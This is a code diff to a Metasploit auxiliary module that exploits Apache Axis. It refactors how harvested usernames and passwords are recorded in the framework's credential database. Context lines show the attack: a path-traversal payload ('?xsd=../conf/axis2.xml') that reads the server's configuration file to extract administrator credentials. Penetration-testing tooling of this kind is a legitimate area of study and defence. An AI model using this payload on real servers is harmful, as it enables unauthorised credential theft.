@@ -70,6 +70,32 @@ class Metasploit3 < Msf::Auxiliary
     end
   end
 
+  def report_cred(opts)
+    service_data = {
+      address: opts[:ip],
+      port: opts[:port],
+      service_name: (ssl ? 'https' : 'http'),
+      protocol: 'tcp',
+      workspace_id: myworkspace_id
+    }
+
+    credential_data = {
+      origin_type: :service,
+      module_fullname: fullname,
+      username: opts[:user],
+      private_data: opts[:password],
+      private_type: :password
+    }.merge(service_data)
+
+    login_data = {
+      last_attempted_at: DateTime.now,
+      core: create_credential(credential_data),
+      status: Metasploit::Model::Login::Status::SUCCESSFUL,
+    }.merge(service_data)
+
+    create_credential_login(login_data)
+  end
+
   def get_credentials(uri)
     lfi_payload = "?xsd=../conf/axis2.xml"
 
@@ -96,15 +122,7 @@ class Metasploit3 < Msf::Auxiliary
 
           print_good("#{target_url} - Apache Axis - Credentials Found Username: '#{username}' - Password: '#{password}'")
 
-          report_auth_info(
-            :host => rhost,
-            :port => rport,
-            :sname => (ssl ? 'https' : 'http'),
-            :user => username,
-            :pass => password,
-            :proof => "WEBAPP=\"Apache Axis\", VHOST=#{vhost}",
-            :active => true
-          )
+          report_cred(ip: rhost, port: rport, user: username, password: password)
 
         else
           print_error("#{target_url} - Apache Axis - Not Vulnerable")
